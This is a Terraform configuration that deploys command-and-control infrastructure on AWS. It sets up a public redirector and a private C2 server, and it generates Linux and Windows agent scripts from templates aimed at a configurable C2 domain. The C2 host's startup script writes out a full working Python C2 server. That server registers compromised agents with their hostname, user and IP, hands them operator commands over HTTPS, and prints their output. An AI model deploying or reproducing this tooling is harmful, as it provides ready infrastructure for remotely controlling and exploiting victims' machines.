provider "aws" {
  region = var.AWS_REGION
}

resource "aws_vpc" "prod-vpc" {
  cidr_block           = "10.10.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
  instance_tenancy     = "default"
  tags = { Name = "prod-vpc" }
}

resource "aws_internet_gateway" "prod-igw" {
  vpc_id = aws_vpc.prod-vpc.id
  tags   = { Name = "prod-igw" }
}

# Public Route Table
resource "aws_route_table" "prod-public-crt" {
  vpc_id = aws_vpc.prod-vpc.id
  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.prod-igw.id
  }
  tags = { Name = "prod-public-crt" }
}

# Private Route Table (no internet gateway)
resource "aws_route_table" "prod-private-crt" {
  vpc_id = aws_vpc.prod-vpc.id
  tags = { Name = "prod-private-crt" }
}

# Public Subnet for Redirector
resource "aws_subnet" "prod-subnet-public-1" {
  vpc_id                  = aws_vpc.prod-vpc.id
  cidr_block              = "10.10.0.0/24"
  map_public_ip_on_launch = true
  availability_zone       = var.AVAILABILITY_ZONE
  tags                    = { Name = "prod-subnet-public-1" }
}

# Private Subnet for C2
resource "aws_subnet" "prod-subnet-private-1" {
  vpc_id            = aws_vpc.prod-vpc.id
  cidr_block        = "10.10.1.0/24"
  availability_zone = var.AVAILABILITY_ZONE
  tags              = { Name = "prod-subnet-private-1" }
}

# Route Table Associations
resource "aws_route_table_association" "prod-crta-public-subnet-1" {
  subnet_id      = aws_subnet.prod-subnet-public-1.id
  route_table_id = aws_route_table.prod-public-crt.id
}

resource "aws_route_table_association" "prod-crta-private-subnet-1" {
  subnet_id      = aws_subnet.prod-subnet-private-1.id
  route_table_id = aws_route_table.prod-private-crt.id
}

# Security Group for Redirector (Jump Host)
resource "aws_security_group" "subnet-sg-redir" {
  name        = "ubuntu-subnet-sg-redir"
  description = "Allow redirector traffic"
  vpc_id      = aws_vpc.prod-vpc.id
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    description = "Internet Access"
  }
  
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTPS Access"
  }
  
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "HTTP Access"
  }
  
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
    description = "SSH Access"
  }
  
  # Allow all traffic to C2 subnet
  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["10.10.1.0/24"]
    description = "C2 Subnet Access"
  }
  
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["10.10.1.0/24"]
    description = "C2 Subnet Access"
  }
  
  tags = { Name = "subnet-sg-redir" }
}

# Security Group for C2 (Private)
resource "aws_security_group" "subnet-sg-c2" {
  name        = "ubuntu-subnet-sg-c2"
  description = "Allow C2 traffic from redirector only"
  vpc_id      = aws_vpc.prod-vpc.id
  
  # SSH access only from redirector security group
  ingress {
    from_port       = 22
    to_port         = 22
    protocol        = "tcp"
    security_groups = [aws_security_group.subnet-sg-redir.id]
    description     = "SSH from Redirector"
  }
  
  # C2 traffic from redirector
  ingress {
    from_port       = 4443
    to_port         = 4443
    protocol        = "tcp"
    security_groups = [aws_security_group.subnet-sg-redir.id]
    description     = "C2 HTTPS from Redirector"
  }
  
  # Allow all traffic from redirector security group
  ingress {
    from_port       = 0
    to_port         = 0
    protocol        = "-1"
    security_groups = [aws_security_group.subnet-sg-redir.id]
    description     = "All traffic from Redirector"
  }
  
  # Allow outbound to redirector for responses
  egress {
    from_port       = 0
    to_port         = 0
    protocol        = "-1"
    security_groups = [aws_security_group.subnet-sg-redir.id]
    description     = "All traffic to Redirector"
  }
  
  tags = { Name = "subnet-sg-c2" }
}

resource "tls_private_key" "ubuntu-ssh-key" {
  algorithm = "ED25519"
}

resource "aws_key_pair" "kp" {
  key_name   = "ubuntu-SSH-Key-${random_string.resource_code.result}"
  public_key = tls_private_key.ubuntu-ssh-key.public_key_openssh
}

resource "local_file" "ssh_key" {
  filename        = "${aws_key_pair.kp.key_name}.pem"
  content         = tls_private_key.ubuntu-ssh-key.private_key_pem
  file_permission = "0600"
}

resource "local_file" "ssh_key_pub" {
  filename        = "${aws_key_pair.kp.key_name}.pub"
  content         = tls_private_key.ubuntu-ssh-key.public_key_openssh
  file_permission = "0600"
}

data "aws_ssm_parameter" "ubuntu_ami" {
  name = "/aws/service/canonical/ubuntu/server/22.04/stable/current/amd64/hvm/ebs-gp2/ami-id"
}

resource "aws_instance" "cnc-server" {
  ami                         = data.aws_ssm_parameter.ubuntu_ami.value
  instance_type               = "t2.medium"
  subnet_id                   = aws_subnet.prod-subnet-private-1.id
  private_ip                  = "10.10.1.204"
  vpc_security_group_ids      = [aws_security_group.subnet-sg-c2.id]
  associate_public_ip_address = false
  key_name                    = aws_key_pair.kp.key_name
  tags                        = { Name = "Ubuntu C2 Server" }

  user_data = <<-EOF
    #!/bin/bash
    set -e

    # 1) Generate self-signed cert/key
    openssl req -x509 -newkey rsa:2048 \
      -keyout /home/ubuntu/key.pem \
      -out     /home/ubuntu/cert.pem \
      -days    365 -nodes \
      -subj    "/CN=internal-c2"
    chown ubuntu:ubuntu /home/ubuntu/key.pem /home/ubuntu/cert.pem

    # 2) Write out the C2 Python server
    cat << 'PYCODE' > /home/ubuntu/C2.py
    from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
    import ssl
    import json
    import threading
    import sys
    import readline

    # Globals
    COMMAND_LOCK      = threading.Lock()
    COMMAND_BUFFERS   = {}      # agent_id -> str
    AGENT_INFO        = {}      # agent_id -> dict(hostname, username, local_ip, last_output)
    SELECTED_AGENT    = None    # currently active session

    # ANSI colors
    GREEN  = '\\033[32m'
    ORANGE = '\\033[38;5;208m'
    RESET  = '\\033[0m'

    class C2Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def send_json(self, code, obj):
            payload = json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Type",   "application/json")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, fmt, *args):
            return  # suppress default logging

        def do_GET(self):
            global SELECTED_AGENT
            if self.path != "/api/v2/status":
                return self.send_json(404, {"error": "Not found"})

            agent_id = self.headers.get("Agent-ID", "").strip()
            if agent_id not in AGENT_INFO:
                return self.send_json(200, {"command": ""})

            if SELECTED_AGENT is None:
                SELECTED_AGENT = agent_id
                sys.stdout.write(f"{GREEN}[+] Auto-selected session {agent_id}{RESET}\\n")
                sys.stdout.write("C2> ")
                sys.stdout.flush()

            if agent_id != SELECTED_AGENT:
                return self.send_json(200, {"command": ""})

            with COMMAND_LOCK:
                cmd = COMMAND_BUFFERS.get(agent_id, "")
                COMMAND_BUFFERS[agent_id] = ""

            return self.send_json(200, {"command": cmd})

        def do_POST(self):
            if self.path != "/api/v2/users/update":
                return self.send_json(404, {"error": "Not found"})

            length = int(self.headers.get("Content-Length", 0))
            body   = self.rfile.read(length)
            try:
                data = json.loads(body)
            except json.JSONDecodeError:
                return self.send_json(400, {"error": "Invalid JSON"})

            agent_id = data.get("agent_id", "")
            if not agent_id:
                return self.send_json(400, {"error": "Missing agent_id"})

            hostname = data.get("hostname", "unknown")
            username = data.get("username", "unknown")
            local_ip = data.get("local_ip", "unknown")
            output   = data.get("output", "")

            is_new = agent_id not in AGENT_INFO
            info   = AGENT_INFO.setdefault(agent_id, {
                "hostname":    hostname,
                "username":    username,
                "local_ip":    local_ip,
                "last_output": None
            })

            if is_new:
                sys.stdout.write(
                    f"{GREEN}[+] New agent {agent_id} online: "
                    f"{hostname} / {username} @ {local_ip}{RESET}\\n"
                )
                sys.stdout.write("C2> ")
                sys.stdout.flush()

            host = info.get("hostname", hostname)
            ip   = info.get("local_ip",   local_ip)

            if output and info.get("last_output") != output:
                info["last_output"] = output
                sys.stdout.write(
                    f"\\r{ORANGE}{host} ({ip})> {output}{RESET}\\n"
                )
                sys.stdout.write("C2> ")
                sys.stdout.flush()

            return self.send_json(200, {"status": "ok"})

    def list_sessions():
        if not AGENT_INFO:
            print("No active sessions.")
        else:
            print(f"{GREEN}Active sessions:{RESET}")
            for agent_id, info in AGENT_INFO.items():
                sel = " [selected]" if agent_id == SELECTED_AGENT else ""
                print(f"  {GREEN}{agent_id}{sel}{RESET}")
                print(f"   {GREEN} Host: {info['hostname']}, User: {info['username']}, IP: {info['local_ip']}{RESET}")

    def switch_session(agent_id):
        global SELECTED_AGENT
        if agent_id not in AGENT_INFO:
            print(f"[!] No such agent: {agent_id}")
            return
        COMMAND_BUFFERS[SELECTED_AGENT] = ""
        SELECTED_AGENT = agent_id
        print(f"[+] Switched to session {agent_id}")

    def kill_session(agent_id):
        global SELECTED_AGENT
        if agent_id in AGENT_INFO:
            del AGENT_INFO[agent_id]
            COMMAND_BUFFERS.pop(agent_id, None)
            if SELECTED_AGENT == agent_id:
                SELECTED_AGENT = None
                print(f"[+] Killed and deselected session {agent_id}")
            else:
                print(f"[+] Killed session {agent_id}")
        else:
            print(f"[!] No such agent: {agent_id}")

    def operator():
        print("C2> ", end="", flush=True)
        while True:
            try:
                line = input().strip()
            except KeyboardInterrupt:
                print("\\n[!] Exiting.")
                return

            if not line:
                print("C2> ", end="", flush=True)
                continue

            parts = line.split()
            cmd   = parts[0].lower()

            if cmd == "sessions":
                if len(parts) == 1:
                    list_sessions()
                else:
                    switch_session(parts[1])
            elif cmd == "kill" and len(parts) == 2:
                kill_session(parts[1])
            else:
                if SELECTED_AGENT is None:
                    print("[!] No session selected. Use `sessions` to pick one.")
                else:
                    with COMMAND_LOCK:
                        COMMAND_BUFFERS[SELECTED_AGENT] = line

            print("C2> ", end="", flush=True)

    if __name__ == "__main__":
        readline.set_auto_history(True)
        readline.set_history_length(1000)
        readline.set_completer_delims(' \\t\\n')
        httpd = ThreadingHTTPServer(('0.0.0.0', 4443), C2Handler)
        ctx  = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        print("[*] C2 server running on https://0.0.0.0:4443")
        operator()
    PYCODE

    # 3) Final perms
    chown ubuntu:ubuntu /home/ubuntu/C2.py
    chmod +x          /home/ubuntu/C2.py
  EOF
}


# Redirector Server (Public)
resource "aws_instance" "redirector-server" {
  ami                    = data.aws_ssm_parameter.ubuntu_ami.value
  instance_type          = "t2.medium"
  subnet_id              = aws_subnet.prod-subnet-public-1.id
  private_ip             = "10.10.0.205"
  vpc_security_group_ids = [aws_security_group.subnet-sg-redir.id]
  associate_public_ip_address = true
  key_name               = aws_key_pair.kp.key_name
  tags                   = { Name = "C2 Redirector Server" }
  
  # Enable SSH agent forwarding
  user_data = <<-EOF
    #!/bin/bash
    touch /home/ubuntu/redirectorconfig.sh
    chmod +x /home/ubuntu/redirectorconfig.sh
    echo "ForwardAgent yes" >> /etc/ssh/ssh_config
    echo "AllowAgentForwarding yes" >> /etc/ssh/sshd_config
    sudo systemctl restart sshd
  EOF
}

# Random string resource for SSH key naming
resource "random_string" "resource_code" {
  length  = 6
  upper   = false
  lower   = true
  numeric = true
  special = false
}

resource "local_file" "linux_agent_py" {
  filename = "${path.module}/linux_agent.py"
  content  = templatefile("${path.module}/linux_agent.py.tpl", {
    c2_domain = var.c2_domain
  })
}

resource "local_file" "windows_agent_ps1" {
  filename = "${path.module}/windows_agent.ps1"
  content  = templatefile("${path.module}/windows_agent.ps1.tpl", {
    c2_domain = var.c2_domain
  })
}
